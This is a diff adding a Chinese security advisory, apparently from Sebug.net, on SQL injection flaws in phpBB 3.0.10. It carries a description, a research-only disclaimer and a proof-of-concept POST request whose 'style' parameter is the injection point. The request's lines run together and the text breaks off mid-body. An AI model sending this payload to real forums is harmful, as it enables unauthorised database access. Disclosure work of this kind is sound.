@@ -1,0 +1,19 @@
+phpBB 3.0.10 多个SQL注入漏洞
+
+洞版本:
+
+phpBB 3.0.10
+漏洞描述:
+
+BUGTRAQ  ID: 54734
+
+phpBB是全球流行的开源公告牌系统。
+
+phpBB 3.0.10及其他版本在实现上存在多个SQL注入漏洞，成功利用后可允许攻击者控制应用，访问或修改数据，利用下层数据库中的其他漏洞。
+<* 参考
+HauntIT
+ *>
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.Request :2. 3.---4.POST /kuba/phpBB/phpBB3/ucp.php?i=prefs&mode=personal HTTP/1.15.Host: localhost6.User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.17.Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.88.Accept-Language: en-us,en;q=0.59.Accept-Encoding: gzip, deflate10.Proxy-Connection: keep-alive11.Referer: http://localhost/kuba/phpBB/phpBB3/ucp.php?i=17412.Cookie: style_cookie=null; phpbb3_t4h3b_u=2; phpbb3_t4h3b_k=; phpbb3_t4h3b_sid=13.Content-Type: application/x-www-form-urlencoded14.Content-Length: 25815.Connection: close16. 17.viewemail=118.&massemail=119.&allowpm=120.&hideonline=021.&notifypm=122.&popuppm=023.&lang=en24.&style=%2b111111111125.&tz=026.&dst=027.&dateoptions=D+M+d%2C+Y+g%3Ai+a28.&dateformat=D+M+d%2C+Y+g%3Ai+a29.&submit=Submit30.&creation_time=134337087731.&form_token=576...
